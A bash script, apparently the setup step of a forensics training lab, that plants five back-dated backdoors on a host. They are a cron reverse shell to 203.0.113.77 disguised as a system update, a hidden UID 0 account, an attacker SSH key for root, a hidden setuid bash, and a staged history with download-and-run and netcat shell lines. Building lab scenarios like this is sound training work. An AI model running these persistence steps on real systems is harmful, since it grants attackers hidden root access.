#!/bin/bash
# 23 · 预埋 5 处后门（构建期执行一次；mtime 固定为「入侵当晚」，供时间线还原）
set -e

# ① 计划任务反弹：伪装成系统更新任务的高频回连（02:41）
cat > /etc/cron.d/system-update <<'EOF'
# 系统更新检查（攻击者伪装）
*/10 * * * * root bash -c 'bash -i >& /dev/tcp/203.0.113.77/4444 0>&1'
EOF
touch -d '2026-04-28 02:41:17' /etc/cron.d/system-update

# ② UID 0 隐蔽用户 support（03:05）
echo 'support:x:0:0::/home/support:/bin/bash' >> /etc/passwd
echo 'support:$6$Fq8zXk3p$e0Nvv1E3yG7jjxZgUpqlLCXbqRjyc6TZlBq/mCnExQkb7lcd9W4DJcBCGkKPYhW3mh2iPIh0lSFyU9Al1cZcq.:19800:0:99999:7:::' >> /etc/shadow
mkdir -p /home/support && chmod 700 /home/support
touch -d '2026-04-28 03:05:44' /etc/passwd /etc/shadow /home/support

# ③ ssh 公钥后门：攻击者 key 常驻 root 的 authorized_keys（03:22）
mkdir -p /root/.ssh && chmod 700 /root/.ssh
cat > /root/.ssh/authorized_keys <<'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fXq1vJa0dPZqjY3lkFxWmCJ8hN4sT2uV9eZqKx1bLm3nR8wYpQoSgHdF6cEiA5rUv7tXjN0kZlQz2aWmB4yVcD1pM9oLsRf3hTgJ8eIqUnXxC6kJw1aY2bN5mS7vZqP0dEfG3hU8cAiWjRtBuHlOyQnV4xM6pLkZe2sF9aXoQdYw8uCvTm1jNbEh5rA7gP3iDkS0qJc2lWz4xVfRt6yM8nOe9hUuBaQw5sLdC7vPjX1kTzG2fI0mAbNq4rE6tW9xYhJu3oScV5pL8iZgKd1wRxQyH7bMnF0vT2sU9eDcA4jBP6lWmNq3xRzVt5hO8iGfY0uKpT1bXwCe7nSdLz6jMvB2aQrH9yU4gEfC8o3tNwX1pZkSiA7mQbF5nVhL0uJdRx6T9sYvWcD2eG3aP4mB1fZrX8oN9jQwE5tS6uH7kI0lMnF2vC4dA=== attacker@lab
EOF
chmod 600 /root/.ssh/authorized_keys
touch -d '2026-04-28 03:22:09' /root/.ssh/authorized_keys

# ④ 隐藏 SUID：隐藏名（点开头）+ setuid 的 bash 拷贝——提权后门（03:40）
cp /bin/bash /usr/local/bin/.sysmon
chmod 4755 /usr/local/bin/.sysmon
touch -d '2026-04-28 03:40:31' /usr/local/bin/.sysmon

# ⑤ history 残留：攻击者的操作自白（04:02）
cat > /root/.bash_history <<'EOF'
uname -a
curl -s http://203.0.113.77/tools/x.sh -o /tmp/x.sh
bash /tmp/x.sh
nc -e /bin/bash 203.0.113.77 4444
echo 'support:x:0:0::/home/support:/bin/bash' >> /etc/passwd
cp /bin/bash /usr/local/bin/.sysmon && chmod +s /usr/local/bin/.sysmon
EOF
touch -d '2026-04-28 04:02:55' /root/.bash_history

echo "[plant] 5 处后门已预埋：cron / UID0 用户 / ssh key / 隐藏 SUID / history"
